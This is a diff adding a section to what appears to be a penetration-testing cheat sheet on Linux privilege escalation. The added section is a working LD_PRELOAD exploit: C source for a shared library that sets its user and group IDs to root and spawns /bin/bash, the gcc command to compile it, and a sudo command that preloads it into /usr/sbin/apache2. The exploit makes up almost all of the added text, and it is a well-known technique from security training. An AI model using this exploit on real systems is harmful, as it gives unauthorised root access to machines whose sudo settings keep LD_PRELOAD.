@@ -149,6 +149,32 @@ If it is a restricted shell we might need to escape
 
 Some capabilites set to a process my allow to escalate to root
 
+## Check Shared libraries
+
+If by doing sudo -l , the env variable has env_keep+=LD_PRELOAD and we can use a command as sudo like /usr/sbin/apache2, and this command doesnt have a gtfobin, we can use the LD_PRELOAD of the librarie to load code before the executing of the command as sudo like:
+
+	#include <stdio.h>
+	#include <sys/types.h>
+	#include <stdlib.h>
+
+	void _init() {
+	unsetenv("LD_PRELOAD");
+	setgid(0);
+	setuid(0);
+	system("/bin/bash");
+	}
+
+Compiling it like 
+
+	gcc -fPIC -shared -o root.so root.c -nostartfiles
+
+And then doing
+
+	sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
+
+	Remember to specify the complete path to root.so
+
+
 ## Run linPEAS script
 
 	https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
